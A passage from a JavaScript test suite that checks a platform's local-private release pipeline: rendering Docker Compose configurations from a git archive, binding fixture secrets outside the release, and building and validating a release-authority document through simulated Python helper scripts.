  replaceMount("broker-auth-bootstrap", "/run/platform/hosted-workloads.lock.json", localLock);
  replaceMount("project-router", "/var/www/project-state", stateDirectory);
  replaceMount("project-router", "/run/platform/hosted-workloads.lock.json", localLock);
  replaceMount("mariadb", "/etc/mysql/ssl", certificatesDirectory);
  Object.assign(config.services["project-router"].environment, {
    PROJECT_ROUTER_LOCAL_PRIVATE_COMPATIBILITY_MODE:
      LOCAL_PRIVATE_PROJECT_ROUTER_COMPATIBILITY.mode,
    PROJECT_ROUTER_WORKLOAD_LOCK_SHA256:
      crypto.createHash("sha256").update(fs.readFileSync(localLock)).digest("hex"),
    PROJECT_HOST_SUFFIX: LOCAL_PRIVATE_PROJECT_ROUTER_COMPATIBILITY.hostSuffix,
    PROJECT_ROUTER_ALLOWED_UPSTREAMS:
      LOCAL_PRIVATE_PROJECT_ROUTER_COMPATIBILITY.allowedUpstreams,
    NODE_PROJECT_HOSTS: "",
    PROJECT_UPSTREAMS: "",
    STATIC_PROJECT_UPSTREAMS: "",
    NODE_PROJECT_UPSTREAMS:
      LOCAL_PRIVATE_PROJECT_ROUTER_COMPATIBILITY.nodeProjectUpstreams,
    PHP_PROJECT_UPSTREAMS:
      LOCAL_PRIVATE_PROJECT_ROUTER_COMPATIBILITY.phpProjectUpstreams,
  });
  config.services.mariadb.networks = {
    [LOCAL_PRIVATE_PROJECT_ROUTER_COMPATIBILITY.mariadbCompatibilityAlias.network]: {
      aliases: [LOCAL_PRIVATE_PROJECT_ROUTER_COMPATIBILITY.mariadbCompatibilityAlias.alias],
    },
  };

  return {
    config,
    environment,
    lock: JSON.parse(fs.readFileSync(localLock, "utf8")),
    sourceDirectory,
  };
}

function parseMaterializedEnvironment(bytes) {
  const environment = new Map();
  for (const line of bytes.toString("utf8").replaceAll("\r\n", "\n").split("\n")) {
    if (line === "" || line.startsWith("#")) continue;
    const separator = line.indexOf("=");
    assert.ok(separator > 0, `invalid materialized environment line: ${line}`);
    const name = line.slice(0, separator);
    assert.match(name, /^[A-Za-z_][A-Za-z0-9_]*$/);
    assert.equal(environment.has(name), false, `duplicate materialized environment: ${name}`);
    environment.set(name, line.slice(separator + 1));
  }
  return environment;
}

function canonicalFixtureJson(value) {
  if (Array.isArray(value)) return `[${value.map(canonicalFixtureJson).join(",")}]`;
  if (value && typeof value === "object") {
    return `{${Object.keys(value).sort().map((key) => (
      `${JSON.stringify(key)}:${canonicalFixtureJson(value[key])}`
    )).join(",")}}`;
  }
  return JSON.stringify(value);
}

function materializeArchiveRenderEnvironment({
  staging,
  release,
  reconciler,
  opsImage,
  runtimeIdentity = null,
  paths,
}) {
  const program = String.raw`
import json, os, runpy, sys
m = runpy.run_path(os.environ["V1_TEST_RECONCILER"], run_name="v1_archive_render_fixture")
g = m["materialize_environment"].__globals__
for name in (
    "PROJECT_SOURCE_ROOT", "DEPLOYMENT_REPO", "PROJECT_STATE_ROOT",
    "CERTIFICATES_ROOT", "SECRET_DIR", "LOCAL_CA_CERTIFICATE",
    "DATABASE_SECRET", "BOOTSTRAP_SECRET", "KEYCLOAK_CLIENT_SECRET",
    "CONFIDENTIAL_BACKUP_PASSPHRASE",
):
    g[name] = os.environ["V1_TEST_" + name]
runtime = json.loads(os.environ["V1_TEST_RUNTIME_IDENTITY"])
data, _ = m["materialize_environment"](
    os.environ["V1_TEST_STAGING"],
    os.environ["V1_TEST_RELEASE"],
    os.environ["V1_TEST_OPS_IMAGE"],
    runtime,
)
sys.stdout.buffer.write(data)
`;
  const execution = spawnSync("python3", ["-I", "-c", program], {
    encoding: null,
    env: {
      PATH: process.env.PATH,
      LANG: "C",
      LC_ALL: "C",
      V1_TEST_RECONCILER: reconciler,
      V1_TEST_STAGING: staging,
      V1_TEST_RELEASE: release,
      V1_TEST_OPS_IMAGE: opsImage,
      V1_TEST_RUNTIME_IDENTITY: JSON.stringify(runtimeIdentity),
      V1_TEST_PROJECT_SOURCE_ROOT: paths.source,
      V1_TEST_DEPLOYMENT_REPO: paths.data,
      V1_TEST_PROJECT_STATE_ROOT: paths.state,
      V1_TEST_CERTIFICATES_ROOT: paths.certificates,
      V1_TEST_SECRET_DIR: paths.secrets,
      V1_TEST_LOCAL_CA_CERTIFICATE: paths.localCa,
      V1_TEST_DATABASE_SECRET: paths.databaseSecret,
      V1_TEST_BOOTSTRAP_SECRET: paths.bootstrapSecret,
      V1_TEST_KEYCLOAK_CLIENT_SECRET: paths.keycloakClientSecret,
      V1_TEST_CONFIDENTIAL_BACKUP_PASSPHRASE: paths.confidentialPassphrase,
    },
    maxBuffer: 2 * 1024 * 1024,
    timeout: 30_000,
  });
  assert.equal(
    execution.status,
    0,
    execution.stderr?.toString("utf8") ?? "materialize_environment failed",
  );
  return execution.stdout;
}

function projectArchiveRuntimeIdentity({ reconciler, render, runtimeIdentity }) {
  const program = String.raw`
import json, os, runpy, sys
m = runpy.run_path(os.environ["V1_TEST_RECONCILER"], run_name="v1_archive_identity_projection")
render = json.load(sys.stdin)
runtime = json.loads(os.environ["V1_TEST_RUNTIME_IDENTITY"])
document = m["runtime_identity_document"](runtime)
sys.stdout.buffer.write(m["source_render_without_runtime_identity"](render, document))
`;
  const execution = spawnSync("python3", ["-I", "-c", program], {
    encoding: "utf8",
    env: {
      PATH: process.env.PATH,
      LANG: "C",
      LC_ALL: "C",
      V1_TEST_RECONCILER: reconciler,
      V1_TEST_RUNTIME_IDENTITY: JSON.stringify(runtimeIdentity),
    },
    input: JSON.stringify(render),
    maxBuffer: 32 * 1024 * 1024,
    timeout: 10_000,
  });
  assert.equal(
    execution.status,
    0,
    execution.stderr || "runtime identity projection failed",
  );
  return JSON.parse(execution.stdout);
}

function validateArchiveRenderAuthoritySemantics({ reconciler, controller, render }) {
  const program = String.raw`
import json, os, runpy, sys
m = runpy.run_path(os.environ["V1_TEST_RECONCILER"], run_name="v1_archive_authority_semantics")
c = runpy.run_path(os.environ["V1_TEST_CONTROLLER"], run_name="v1_archive_controller_semantics")
render = json.load(sys.stdin)
result = {}
for container_name in m["ACTIVE_MANAGED"]:
  service_name = m["ACTIVE_SERVICE_BY_CONTAINER"][container_name]
  reconciler_semantic = m["render_service_semantics"](
    render, service_name, "sha256:" + "a" * 64, m["PROJECT_BY_NAME"][container_name]
  )
  controller_semantic = c["render_service_semantics"](
    render, service_name, "sha256:" + "a" * 64, c["PROJECT_BY_NAME"][container_name]
  )
  if reconciler_semantic != controller_semantic:
    raise AssertionError("reconciler/controller semantic mismatch for " + container_name)
  result[container_name] = reconciler_semantic
sys.stdout.write(json.dumps(result, sort_keys=True))
`;
  const execution = spawnSync("python3", ["-I", "-c", program], {
    encoding: "utf8",
    env: {
      PATH: process.env.PATH,
      LANG: "C",
      LC_ALL: "C",
      V1_TEST_CONTROLLER: controller,
      V1_TEST_RECONCILER: reconciler,
    },
    input: JSON.stringify(render),
    maxBuffer: 32 * 1024 * 1024,
    timeout: 30_000,
  });
  assert.equal(
    execution.status,
    0,
    execution.stderr || "render authority semantic validation failed",
  );
  return JSON.parse(execution.stdout);
}

function buildArchivePreAuthority({
  reconciler,
  release,
  renderBytes,
  environmentBytes,
  runtimeIdentity,
  commit,
  tree,
  archiveSha256,
  archiveBytes,
  compose,
}) {
  const program = String.raw`
import base64, fcntl, hashlib, json, os, runpy, shutil, stat, sys, tempfile
m = runpy.run_path(os.environ["V1_TEST_RECONCILER"], run_name="v1_archive_pre_authority")
payload = json.load(sys.stdin)
render_bytes = base64.b64decode(payload["renderBytes"])
environment_bytes = base64.b64decode(payload["environmentBytes"])
archive_bytes = base64.b64decode(payload["archiveBytes"])
_, environment = m["parse_env"](environment_bytes, "simulated PRE environment")
g = m["build_authority"].__globals__
state = os.path.realpath(tempfile.mkdtemp(prefix="v1-pre-authority-"))
release_owner = os.stat(os.path.join(
  payload["release"], "config/no-hosted-workloads.local-private.lock.json"
))
g["OWNER_UID"] = release_owner.st_uid
g["OWNER_GID"] = release_owner.st_gid
os.chown(state, g["OWNER_UID"], g["OWNER_GID"])
g["AUTHORITY"] = os.path.join(state, "exact-release-authority.json")
g["AUTHORITY_ARCHIVE_DIR"] = os.path.join(state, "release-authorities")
g["RENDER_ENV"] = os.path.join(state, "exact-compose.env")
g["RENDER"] = os.path.join(state, "exact-compose-render.json")
g["SOURCE_ARCHIVE"] = os.path.join(state, "exact-source-archive.tar")
os.makedirs(g["AUTHORITY_ARCHIVE_DIR"], mode=0o700)
for pathname, data, mode in (
  (g["RENDER_ENV"], environment_bytes, 0o400),
  (g["RENDER"], render_bytes, 0o444),
  (g["SOURCE_ARCHIVE"], archive_bytes, 0o444),
):
  with open(pathname, "xb") as stream: stream.write(data)
  os.chmod(pathname, mode)
artifacts = os.path.join(state, "installed-artifacts")
os.makedirs(artifacts, mode=0o700)
for name, relative, mode in (
  ("CONTROLLER", "scripts/v1-local-private-control.py", 0o500),
  ("INSTALLER", "scripts/v1-brownfield-install-consumer.py", 0o500),
  ("RECONCILER", "scripts/v1-local-private-reconcile.py", 0o500),
  ("SUDOERS", "sudoers/platform-v1-local-private-control", 0o440),
  ("UNIT", "systemd/platform-v1-local-private-control.service", 0o444),
):
  target = os.path.join(artifacts, name.lower())
  shutil.copyfile(os.path.join(payload["release"], relative), target)
  os.chmod(target, mode)
  g[name] = target
g["SECRET_DIR"] = environment["PLATFORM_SECRETS_ROOT"]
g["DATABASE_SECRET"] = environment["CONTROL_CENTER_DATABASE_URL_SECRET_FILE"]
g["BOOTSTRAP_SECRET"] = environment["CONTROL_CENTER_FIRST_CONFIGURATION_BOOTSTRAP_TOKEN_SECRET_FILE"]
g["KEYCLOAK_CLIENT_SECRET"] = environment["CONTROL_CENTER_FIRST_CONFIGURATION_KEYCLOAK_CLIENT_SECRET_FILE"]
g["CONFIDENTIAL_BACKUP_PASSPHRASE"] = environment["V1_CONFIDENTIAL_BACKUP_PASSPHRASE_FILE"]
g["release_root"] = lambda commit, archive_sha: payload["release"]
docker = os.path.join(state, "docker-compose-adapter")
with open(docker, "x", encoding="utf-8") as stream:
  stream.write("#!/usr/bin/python3\nimport os,sys\n")
  stream.write("args=sys.argv[1:]\n")
  stream.write("sys.exit(64) if not args or args[0] != 'compose' else None\n")
  stream.write("os.execv(" + repr(payload["compose"]) + ", [" + repr(payload["compose"]) + ", *args[1:]])\n")
os.chmod(docker, 0o500)
g["docker_binary"] = lambda: docker
g["image_id_for"] = lambda reference: "sha256:" + hashlib.sha256(reference.encode()).hexdigest()
authority = m["build_authority"](
  payload["commit"], payload["tree"], payload["archiveSha256"], payload["release"],
  environment_bytes, render_bytes, environment, payload["runtimeIdentity"],
)
authority_bytes = m["atomic_json"](g["AUTHORITY"], authority, 0o444)
archived = m["preserve_json"](
  os.path.join(g["AUTHORITY_ARCHIVE_DIR"], authority["documentId"] + ".json"),
  authority,
  "simulated archived exact release authority",
)
if archived != authority_bytes: raise AssertionError("authority archive bytes differ")
reopened, reopened_bytes = m["read_authority"]()
if reopened != authority or reopened_bytes != authority_bytes:
  raise AssertionError("reopened authority differs")
g["render_with_wrapper"] = lambda _release, _environment_sha: render_bytes
targets = m["validate_authority_material"](reopened)
simulated_producer = os.path.join(state, "simulated-pre-producer.py")
with open(simulated_producer, "x", encoding="utf-8") as stream:
  stream.write("""import json, os, socket, stat, sys
run_id = "20990101T000000Z-deadbeef"
expected_environment = {
  "HOME": "/nonexistent", "LANG": "C", "LC_ALL": "C", "PATH": "/usr/bin:/bin",
  "PLATFORM_V1_EVIDENCE_EXECUTOR_FD": "4", "PLATFORM_V1_EVIDENCE_SHARED_LOCK_FD": "3",
}
if any(os.environ.get(key) != value for key, value in expected_environment.items()):
  raise RuntimeError("simulated PRE producer environment is not closed")
if any(key == "DOCKER_HOST" or any(marker in key for marker in ("PASSWORD", "SECRET", "TOKEN")) for key in os.environ):
  raise RuntimeError("simulated PRE producer inherited a forbidden environment binding")
if not stat.S_ISREG(os.fstat(3).st_mode) or not stat.S_ISSOCK(os.fstat(4).st_mode):
  raise RuntimeError("simulated PRE producer did not inherit the lease and executor socket")
endpoint = socket.socket(fileno=4)
request = {"action":"RUNTIME_INVENTORY","id":1,"parameters":{"runId":run_id}}
endpoint.sendall((json.dumps(request, sort_keys=True, separators=(",", ":")) + "\\n").encode("utf-8"))
buffer = b""
while b"\\n" not in buffer:
  chunk = endpoint.recv(65536)
  if not chunk: raise RuntimeError("simulated PRE executor closed before its response")
  buffer += chunk
response_frame = buffer.split(b"\\n", 1)[0]
response = json.loads(response_frame)
if response.get("id") != 1 or response.get("status") != 0:
  raise RuntimeError("simulated PRE executor returned a non-PASS response")
if response_frame + b"\\n" != (json.dumps(response, sort_keys=True, separators=(",", ":")) + "\\n").encode("utf-8"):
  raise RuntimeError("simulated PRE executor response is not canonical")
endpoint.close()
receipt = {"mode":sys.argv[1],"runId":run_id,"status":"PASS"}
sys.stdout.write(json.dumps(receipt, sort_keys=True, separators=(",", ":")) + "\\n")
""")
os.chmod(simulated_producer, 0o400)
executed = []
def simulated_action(authority_value, action, parameters):
  if authority_value is not reopened:
    raise AssertionError("PRE executor did not receive the reopened exact authority")
  executed.append({"action": action, "parameters": parameters})
  return m["executor_success_output"]({"action": action, "runId": parameters["runId"], "status": "PASS"})
real_action = g["execute_typed_evidence_action"]
g["execute_typed_evidence_action"] = simulated_action
real_popen = g["subprocess"].Popen
expected_argv = [
  reopened["evidenceProducer"]["executor"], *reopened["evidenceProducer"]["executorFlags"],
  m["physical"](reopened["evidenceProducer"]["path"]), "pre",
]
popen_calls = []
def simulated_popen(argv, *args, **kwargs):
  expected_environment = {
    "HOME": "/nonexistent", "LANG": "C", "LC_ALL": "C", "PATH": "/usr/bin:/bin",
    "PLATFORM_V1_EVIDENCE_EXECUTOR_FD": "4", "PLATFORM_V1_EVIDENCE_SHARED_LOCK_FD": "3",
  }
  if (
    argv != expected_argv or args or kwargs.get("pass_fds") != (3, 4)
    or kwargs.get("close_fds") is not True or kwargs.get("cwd") != "/"
    or kwargs.get("env") != expected_environment
  ):
    raise AssertionError("PRE producer process contract differs from the reopened exact authority")
  popen_calls.append(list(argv))
  return real_popen([argv[0], *argv[1:-2], simulated_producer, argv[-1]], *args, **kwargs)
g["subprocess"].Popen = simulated_popen
lease = os.path.join(state, "shared-transaction-lease")
lease_fd = os.open(lease, os.O_CREAT | os.O_EXCL | os.O_RDWR, 0o600)
fcntl.flock(lease_fd, fcntl.LOCK_EX)
if lease_fd != 3:
  os.dup2(lease_fd, 3, inheritable=True)
  os.close(lease_fd)
else:
  os.set_inheritable(3, True)
reserved_fd = os.open("/dev/null", os.O_RDONLY)
if reserved_fd != 4:
  os.dup2(reserved_fd, 4, inheritable=False)
  os.close(reserved_fd)
g["SHARED_LOCK_FD"] = 3
g["EXECUTOR_FD_RESERVED"] = True
try:
  pre_receipt = m["invoke_evidence_producer"](reopened, "pre")
finally:
  g["subprocess"].Popen = real_popen
  g["execute_typed_evidence_action"] = real_action
  os.close(3)
try:
  os.fstat(4)
  fd4_closed = False
except OSError:
  fd4_closed = True
pre_entered = (
  pre_receipt == {"mode": "pre", "runId": "20990101T000000Z-deadbeef", "status": "PASS"}
  and executed == [{"action": "RUNTIME_INVENTORY", "parameters": {"runId": "20990101T000000Z-deadbeef"}}]
  and popen_calls == [expected_argv]
  and g["EXECUTOR_FD_RESERVED"] is False
  and fd4_closed
  and len(targets) == len(m["ACTIVE_MANAGED"])
)
print(json.dumps({
  "attachments": len(authority["legacyNetworkAttachments"]),
  "backupTools": len(authority["backupToolImages"]),
  "documentId": authority["documentId"],
  "preExecutorActions": len(executed),
  "preEntered": pre_entered,
  "routes": len(authority["legacyRouteChecks"]),
  "status": authority["status"],
  "targets": len(targets),
}, sort_keys=True))
`;
  const execution = spawnSync("python3", ["-I", "-c", program], {
    encoding: "utf8",
    env: {
      PATH: process.env.PATH,
      LANG: "C",
      LC_ALL: "C",
      V1_TEST_RECONCILER: reconciler,
    },
    input: JSON.stringify({
      archiveSha256,
      archiveBytes: archiveBytes.toString("base64"),
      commit,
      compose,
      environmentBytes: environmentBytes.toString("base64"),
      release,
      renderBytes: renderBytes.toString("base64"),
      runtimeIdentity,
      tree,
    }),
    maxBuffer: 32 * 1024 * 1024,
    timeout: 30_000,
  });
  assert.equal(execution.status, 0, execution.stderr || "PRE authority build failed");
  return JSON.parse(execution.stdout);
}

test("LOCAL_PRIVATE real git archive passes both SHA-pinned Compose renders and exact policy", { timeout: 60_000 }, (t) => {
  const compose = pinnedComposeRendererOrSkip(t);
  if (compose === null) return;
  const archiveBytes = gitArchiveBytes();
  const temporaryRoot = fs.realpathSync.native(
    fs.mkdtempSync(path.join(os.tmpdir(), "v1-local-private-archive-render-")),
  );
  const archiveSha256 = crypto.createHash("sha256").update(archiveBytes).digest("hex");
  const releaseId = `${"1".repeat(40)}-${archiveSha256}`;
  const release = path.join(temporaryRoot, "infrastructure", "releases", releaseId);
  try {
    fs.mkdirSync(release, { recursive: true, mode: 0o755 });
    const extraction = spawnSync("/usr/bin/tar", ["-xf", "-", "-C", release], {
      input: archiveBytes,
      maxBuffer: 2 * 1024 * 1024,
      timeout: 10_000,
    });
    assert.equal(extraction.status, 0, extraction.stderr?.toString("utf8"));
    for (const relativePath of [
      "scripts/no-hosted-core-policy.mjs",
      "scripts/v1-local-private-reconcile.py",
    ]) {
      assert.deepEqual(
        fs.readFileSync(path.join(release, relativePath)),
        fs.readFileSync(path.join(repositoryRoot, relativePath)),
        `${relativePath} differs between the true HEAD archive and the tested worktree`,
      );
    }
    for (const excludedPath of ["projects-portal/state", "traefik/certs"]) {
      assert.equal(
        fs.existsSync(path.join(release, excludedPath)),
        false,
        `${excludedPath} unexpectedly survived extraction of the real git archive`,
      );
    }
    freezeReleaseTree(release);

    const paths = {
      data: path.join(temporaryRoot, "live"),
      state: path.join(temporaryRoot, "live", "projects-portal", "state"),
      certificates: path.join(temporaryRoot, "live", "traefik", "certs"),
      secrets: path.join(temporaryRoot, "live", "secrets"),
      source: path.join(temporaryRoot, "src"),
      staging: path.join(temporaryRoot, "staging"),
      renderState: path.join(temporaryRoot, "render-state"),
    };
    for (const directory of [
      paths.data,
      paths.state,
      paths.certificates,
      paths.secrets,
      paths.source,
      paths.staging,
      paths.renderState,
    ]) {
      fs.mkdirSync(directory, { recursive: true, mode: 0o700 });
      fs.chmodSync(directory, 0o700);
    }
    const writePrivateFixture = (filename, mode) => {
      fs.writeFileSync(filename, "v1-archive-render-fixture\n", { flag: "wx", mode });
      fs.chmodSync(filename, mode);
    };
    const certificate = path.join(paths.certificates, "local-cert.pem");
    const privateKey = path.join(paths.certificates, "local-key.pem");
    paths.localCa = path.join(paths.certificates, "ca.pem");
    paths.bootstrapSecret = path.join(
      paths.secrets,
      "control_center_first_configuration_bootstrap_token.txt",
    );
    paths.keycloakClientSecret = path.join(
      paths.secrets,
      "control_center_first_configuration_keycloak_client_secret.txt",
    );
    for (const [filename, mode] of [
      [certificate, 0o644],
      [privateKey, 0o600],
      [paths.localCa, 0o644],
      [paths.bootstrapSecret, 0o600],
      [paths.keycloakClientSecret, 0o600],
    ]) writePrivateFixture(filename, mode);
    for (const authority of Object.values(LOCAL_PRIVATE_BASE_SECRET_AUTHORITY)) {
      writePrivateFixture(
        path.join(paths.secrets, authority.filename),
        Number.parseInt(authority.mode, 8),
      );
    }
    paths.databaseSecret = path.join(
      paths.secrets,
      LOCAL_PRIVATE_BASE_SECRET_AUTHORITY.control_center_database_url.filename,
    );
    paths.confidentialPassphrase = path.join(paths.renderState, "confidential-backup-passphrase");
    writePrivateFixture(paths.confidentialPassphrase, 0o600);

    const opsSha256 = "f".repeat(64);
    const opsRepository = "127.0.0.1:5000/platform/ops";
    const opsImage = `${opsRepository}@sha256:${opsSha256}`;
    const controlCenterImage = `127.0.0.1:5000/platform/control-center@sha256:${"b".repeat(64)}`;
    const alertDispatcherImage = `127.0.0.1:5000/platform/alert-dispatcher@sha256:${"c".repeat(64)}`;
    const projectRouterImage = `127.0.0.1:5000/platform/project-router@sha256:${"d".repeat(64)}`;
    const stagingEnvironment = [
      "ALERT_EMAIL_TO=qa@fixture.invalid",
      "COMPOSE_PROJECT_NAME=platform_infra_vps",
      `CONTROL_CENTER_IMAGE=${controlCenterImage}`,
      "DOMAIN=fixture.invalid",
      "HOSTED_WORKLOAD_LOCK=/run/platform/hosted-workloads.lock.json",
      "HOSTED_WORKLOAD_MODE=hosted",
      "HOSTED_WORKLOAD_RUNTIME_LOCK_SOURCE=/tmp/not-the-release-lock.json",
      "MAILER_FROM=qa@fixture.invalid",
      "MAILER_REPLY_TO=qa@fixture.invalid",
      "MARIADB_IMAGE=mariadb:12.3.2@sha256:b1c7bf836e64ed9406a8984af29509f40089d55cea14b32f12c4726a1f17104b",
      "MINIO_IMAGE=quay.io/minio/minio:RELEASE.2025-09-07T16-13-09Z@sha256:14cea493d9a34af32f524e538b8346cf79f3321eff8e708c1e2960462bd8936e",
      "NODE_IMAGE=node:26.3.1-alpine@sha256:a2dc166a387cc6ca1e62d0c8e265e49ca985d6e60abc9fe6e6c3d6ce8e63f606",
      `PLATFORM_ALERT_DISPATCHER_IMAGE=${alertDispatcherImage}`,
      `PLATFORM_OPS_IMAGE=${opsImage}`,
      "PLATFORM_COMPOSE_VARIANT=VPS",
      "POSTGRES_IMAGE=postgres:18-alpine@sha256:1b1689b20d16a014a3d195653381cf2caa75a41a92d93b255a9d6ea29fd353aa",
      "PROJECTS_GATEWAY_EMAIL=qa@fixture.invalid",
      `PROJECT_ROUTER_IMAGE=${projectRouterImage}`,
      `RESTIC_IMAGE=restic@sha256:${"a".repeat(64)}`,
      "SMTP_HOST=smtp.fixture.invalid",
      "SMTP_USER=qa",
      "",
    ].join("\n");
    const stagingEnvironmentPath = path.join(paths.staging, ".env");
    fs.writeFileSync(stagingEnvironmentPath, stagingEnvironment, { mode: 0o600 });
    fs.chmodSync(stagingEnvironmentPath, 0o600);

    const composeFiles = [
      "compose.yaml",
      "compose.secrets.yaml",
      "compose.waf.yaml",
      "compose.vps.yaml",
      "compose.vps-waf.yaml",
      "compose.backup-scheduler.yaml",
      "compose.runtime.yaml",
      "compose.networks.yaml",
      "compose.runtime-isolation.yaml",
      "compose.local-private.yaml",
    ];
    const dockerConfig = path.join(temporaryRoot, "docker-config");
    fs.mkdirSync(dockerConfig, { mode: 0o700 });
    const render = (label, environmentBytes, files) => {
      const environmentFile = path.join(paths.renderState, `${label}.env`);
      fs.writeFileSync(environmentFile, environmentBytes, { flag: "wx", mode: 0o400 });
      fs.chmodSync(environmentFile, 0o400);
      const result = spawnSync(compose, [
        "--env-file",
        environmentFile,
        "-p",
        "platform_infra_vps",
        ...files.flatMap((filename) => ["-f", filename]),
        "--profile",
        "backup",
        "config",
        "--format",
        "json",
      ], {
        cwd: release,
        encoding: "utf8",
        env: {
          COMPOSE_ANSI: "never",
          DOCKER_CONFIG: dockerConfig,
          DOCKER_HOST: `unix://${path.join(temporaryRoot, "engine-must-not-exist.sock")}`,
          HOME: temporaryRoot,
          LANG: "C",
          LC_ALL: "C",
          PATH: process.env.PATH,
        },
        maxBuffer: 32 * 1024 * 1024,
        timeout: 30_000,
      });
      assert.equal(
        result.status,
        0,
        `${label} real Compose render failed:\n${result.stdout}\n${result.stderr}`,
      );
      const config = JSON.parse(result.stdout);
      return { bytes: Buffer.from(`${canonicalFixtureJson(config)}\n`), config };
    };

    const sourceEnvironmentBytes = materializeArchiveRenderEnvironment({
      staging: paths.staging,
      release,
      reconciler: path.join(release, "scripts", "v1-local-private-reconcile.py"),
      opsImage,
      paths,
    });
    const sourceEnvironment = parseMaterializedEnvironment(sourceEnvironmentBytes);
    assert.equal(
      sourceEnvironment.get("HOSTED_WORKLOAD_RUNTIME_LOCK_SOURCE"),
      path.join(release, "config", "no-hosted-workloads.local-private.lock.json"),
    );
    assert.equal(
      sourceEnvironmentBytes.toString("utf8")
        .split("\n")
        .filter((line) => line.startsWith("HOSTED_WORKLOAD_RUNTIME_LOCK_SOURCE=")).length,
      1,
    );
    const source = render("source", sourceEnvironmentBytes, composeFiles);
    const lockBytes = fs.readFileSync(
      path.join(release, "config", "no-hosted-workloads.local-private.lock.json"),
    );
    const runtimeCommit = "1".repeat(40);
    const runtimeTree = "4".repeat(40);
    const sourceRenderSha256 = crypto.createHash("sha256").update(source.bytes).digest("hex");
    const workloadLockSha256 = crypto.createHash("sha256").update(lockBytes).digest("hex");
    const runtimeCandidateId = crypto.createHash("sha256").update(JSON.stringify({
      candidateCommit: runtimeCommit,
      candidateTree: runtimeTree,
      sourceRenderSha256,
      workloadLockSha256,
    })).digest("hex");
    const runtimeIdentity = {
      PLATFORM_RUNTIME_CANDIDATE_ID: runtimeCandidateId,
      PLATFORM_RUNTIME_COMMIT: runtimeCommit,
      PLATFORM_RUNTIME_TREE: runtimeTree,
      PLATFORM_RUNTIME_DEPLOYMENT_ID: `v1-local-private:${runtimeCandidateId}`,
      PLATFORM_RUNTIME_SOURCE_RENDER_SHA256: sourceRenderSha256,
      PLATFORM_RUNTIME_WORKLOAD_LOCK_SHA256: workloadLockSha256,
    };
    const finalEnvironmentBytes = materializeArchiveRenderEnvironment({
      staging: paths.staging,
      release,
      reconciler: path.join(release, "scripts", "v1-local-private-reconcile.py"),
      opsImage,
      runtimeIdentity,
      paths,
    });
    const finalEnvironment = parseMaterializedEnvironment(finalEnvironmentBytes);
    const final = render(
      "final",
      finalEnvironmentBytes,
      [...composeFiles, "compose.runtime-identity.yaml"],
    );
    const lock = JSON.parse(lockBytes);
    assert.equal(Object.keys(source.config.services).length, 20);
    assert.equal(Object.keys(final.config.services).length, 20);
    assert.deepEqual(
      projectArchiveRuntimeIdentity({
        reconciler: path.join(release, "scripts", "v1-local-private-reconcile.py"),
        render: final.config,
        runtimeIdentity,
      }),
      source.config,
      "the exact reconciler did not recover the identity-free source render",
    );
    assert.equal(
      Object.keys(validateArchiveRenderAuthoritySemantics({
        reconciler: path.join(release, "scripts", "v1-local-private-reconcile.py"),
        controller: path.join(release, "scripts", "v1-local-private-control.py"),
        render: final.config,
      })).length,
      17,
      "the exact PRE authority path did not normalize every active rendered service",
    );
    const preAuthority = buildArchivePreAuthority({
      reconciler: path.join(release, "scripts", "v1-local-private-reconcile.py"),
      release,
      renderBytes: final.bytes,
      environmentBytes: finalEnvironmentBytes,
      runtimeIdentity,
      commit: runtimeCommit,
      tree: runtimeTree,
      archiveSha256,
      archiveBytes,
      compose,
    });
    assert.deepEqual(preAuthority, {
      attachments: 30,
      backupTools: 5,
      documentId: preAuthority.documentId,
      preExecutorActions: 1,
      preEntered: true,
      routes: 10,
      status: "AUTHORIZED",
      targets: 17,
    });
    assert.match(preAuthority.documentId, /^[0-9a-f]{64}$/);
    assert.deepEqual(
      validateNoHostedCoreAuthority(lock, source.config, release, sourceEnvironment),
      [],
    );
    assert.deepEqual(
      validateNoHostedCoreAuthority(lock, final.config, release, finalEnvironment),
      [],
    );
    for (const excludedPath of ["projects-portal/state", "traefik/certs"]) {
      assert.equal(fs.existsSync(path.join(release, excludedPath)), false);
    }
  } finally {
    if (fs.existsSync(release)) thawReleaseTree(release);
    fs.rmSync(temporaryRoot, { recursive: true, force: true });
  }
});

test("LOCAL_PRIVATE exact overlay binds all base secrets plus two setup secrets outside the release", () => {
  const sandbox = createConsumerSandbox();
  try {
    const { config, environment, lock } = localPrivateQa8Fixture(sandbox);
    assert.equal(lock.coreSemanticPolicy.sha256, localPrivateCoreSemanticPolicySha256);
    assert.equal(lock.protectedResourceNames.secrets.length, 23);
    const overlay = fs.readFileSync(path.join(repositoryRoot, "compose.local-private.yaml"), "utf8");
    for (const [secretName, authority] of Object.entries(
      LOCAL_PRIVATE_BASE_SECRET_AUTHORITY,
    )) {
      assert.ok(
        overlay.includes(
          `  ${secretName}:\n    file: \${PLATFORM_SECRETS_ROOT:?set PLATFORM_SECRETS_ROOT}/${authority.filename}\n`,
        ),
        `${secretName} is not externally bound by the LOCAL_PRIVATE overlay`,
      );
      assert.equal(
        config.secrets[secretName].file,
        path.join(environment.get("PLATFORM_SECRETS_ROOT"), authority.filename),
      );
      assert.equal(
        fs.existsSync(path.join(sandbox.root, coreSemanticPolicyDescriptor.secretFiles[secretName])),
        false,
        `${secretName} remained in the immutable release`,
      );
    }
    const violations = validateNoHostedCoreAuthority(
      lock,
      config,
      sandbox.root,
      environment,
    );
    assert.deepEqual(violations, [], `LOCAL_PRIVATE authority rejected: ${violations.join(",")}`);

    const standardLock = JSON.parse(fs.readFileSync(sandbox.canonicalLock, "utf8"));
    assert.deepEqual(
      validateNoHostedCoreAuthority(standardLock, config, sandbox.root, environment),
      ["policy-binding"],
    );
    const standardEnvironment = new Map(environment);
    standardEnvironment.delete("PLATFORM_COMPOSE_VARIANT");
    assert.deepEqual(
      validateNoHostedCoreAuthority(lock, config, sandbox.root, standardEnvironment),
      ["policy-binding"],
    );
  } finally {
    removeSandbox(sandbox);
  }
});

test("LOCAL_PRIVATE accepts the exact immutable release modes produced by the install consumer", () => {
  const sandbox = createConsumerSandbox();
  try {
    const archiveEntries = gitArchiveEntries();
    for (const excludedPrefix of ["projects-portal/state", "traefik/certs"]) {
      assert.equal(
        archiveEntries.some((entry) => (
          entry === excludedPrefix || entry.startsWith(`${excludedPrefix}/`)
        )),
        false,
        `${excludedPrefix} unexpectedly survived the real git archive boundary`,
      );
    }
    const fixture = localPrivateQa8Fixture(sandbox);
    for (const excludedPath of ["projects-portal/state", "traefik/certs"]) {
      fs.rmSync(path.join(sandbox.root, excludedPath), { recursive: true, force: true });
      assert.equal(
        fs.existsSync(path.join(sandbox.root, excludedPath)),
        false,
        `${excludedPath} was synthesized inside the archive fixture`,
      );
    }
